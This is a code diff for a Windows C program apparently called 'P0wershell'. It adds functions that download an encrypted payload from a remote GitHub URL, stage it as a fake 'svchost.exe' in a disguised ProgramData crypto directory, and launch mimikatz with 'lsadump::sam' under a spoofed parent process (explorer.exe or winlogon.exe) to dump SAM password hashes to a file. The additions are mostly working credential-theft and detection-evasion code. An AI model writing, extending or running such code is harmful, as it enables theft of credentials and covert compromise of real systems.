@@ -4,10 +4,28 @@
 #include <tlhelp32.h>
 #include <urlmon.h>
 #include <shlobj.h>
+#include "payload_extract.h"
 
 #pragma comment(lib, "urlmon.lib")
 
 BOOL WINAPI IsUserAnAdmin(void);
+
+/* ponytail: shared with the svchost.exe (mimikatz) staging path */
+static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
+static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";
+static const char *g_mimi_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";
+static const char *g_mimi_pw = "12@1";
+
+static void audit(const char *fmt, ...) {
+    FILE *f = fopen(g_audit, "a");
+    if (!f) return;
+    va_list ap;
+    va_start(ap, fmt);
+    vfprintf(f, fmt, ap);
+    va_end(ap);
+    fputc('\n', f);
+    fclose(f);
+}
 
 static void log_msg(const char* msg) {
     FILE* f = fopen("C:\\p0wershell.log", "a");
@@ -22,10 +40,99 @@ static void press_exit(int code, const char* why) {
     exit(code);
 }
 
+static DWORD find_pid_by_name(const char *name) {
+    DWORD found = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
+    if (Process32First(snap, &pe)) {
+        do {
+            if (lstrcmpiA(pe.szExeFile, name) == 0) { found = pe.th32ProcessID; break; }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return found;
+}
+
+/* ponytail: stage svchost.exe (mimikatz) into g_dir by downloading the
+   encrypted payload.zip from our own repo and extracting in-process. Runs in
+   P0wershell (elevated, long-lived) instead of msra.exe's worker thread. */
+static void stage_payload(void) {
+    char zipPath[MAX_PATH], outExe[MAX_PATH];
+    wsprintfA(zipPath, "%s\\svchost.zip", g_dir);
+    wsprintfA(outExe, "%s\\svchost.exe", g_dir);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE h = FindFirstFileA(outExe, &fd);
+    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] Already present: %s", outExe); return; }
+
+    audit("[+] Downloading payload.zip -> %s", outExe);
+    HRESULT hr = URLDownloadToFileA(NULL, g_mimi_url, zipPath, 0, NULL);
+    if (hr != S_OK) { audit("[-] payload.zip download failed (0x%lx)", hr); return; }
+    audit("[+] Zip downloaded: %s", zipPath);
+
+    if (!extract_payload(zipPath, outExe, g_mimi_pw))
+        audit("[-] Payload staging failed: %s", outExe);
+    else
+        audit("[+] Payload staged: %s", outExe);
+
+    DeleteFileA(zipPath);
+    audit("[*] Temp zip removed: %s", zipPath);
+}
+
+static void launch_mimikatz(void) {
+    char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
+    wsprintfA(svchost, "%s\\svchost.exe", g_dir);
+    wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
+    wsprintfA(cmd, "\"%s\" \"lsadump::sam\" \"exit\"", svchost);
+
+    DWORD pid = find_pid_by_name("explorer.exe");
+    if (!pid) pid = find_pid_by_name("winlogon.exe");
+    if (!pid) { audit("[-] No stable parent process found for PPID spoofing"); return; }
+
+    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
+    if (!hParent) { audit("[-] OpenProcess failed (%lu)", GetLastError()); return; }
+    audit("[+] Using %s (PID: %lu) as spoofed parent", (pid ? "explorer/winlogon" : "?"), pid);
+
+    SIZE_T attrSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    PPROC_THREAD_ATTRIBUTE_LIST attrList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
+    if (!attrList) { CloseHandle(hParent); return; }
+
+    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
+        audit("[-] InitializeProcThreadAttributeList failed (%lu)", GetLastError());
+        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
+    }
+    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
+        audit("[-] UpdateProcThreadAttribute failed (%lu)", GetLastError());
+        DeleteProcThreadAttributeList(attrList); HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
+    }
+    audit("[+] PPID attribute set");
+
+    HANDLE hOut = CreateFileA(dump, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    STARTUPINFOA si = { .cb = sizeof(si) };
+    if (hOut != INVALID_HANDLE_VALUE) { si.hStdOutput = hOut; si.hStdError = hOut; si.dwFlags = STARTF_USESTDHANDLES; }
+    PROCESS_INFORMATION pi;
+    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM", pi.dwProcessId);
+        CloseHandle(pi.hThread);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        audit("[+] SAM dump completed -> %s", dump);
+    } else {
+        audit("[-] CreateProcess svchost.exe failed (%lu)", GetLastError());
+    }
+    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    CloseHandle(hParent);
+}
+
 int main(void) {
     { FILE* m = fopen("C:\\p0wershell.started", "w"); if (m) { fputs("1", m); fclose(m); } }
     DeleteFileA("C:\\p0wershell.log");
     log_msg("[+] P0wershell started");
+    g_audit_fn = audit;
 
     if (!IsUserAnAdmin()) {
         printf("[-] Not running as admin.\n");
@@ -120,6 +227,9 @@ int main(void) {
         printf("[-] userenv.dll download failed (0x%lx) — place it manually\n", hr);
     else
         printf("[+] userenv.dll downloaded\n");
+
+    stage_payload();
+    launch_mimikatz();
 
     printf("[+] Downloading mimilib.dll...\n");
     hr = URLDownloadToFileA(NULL,
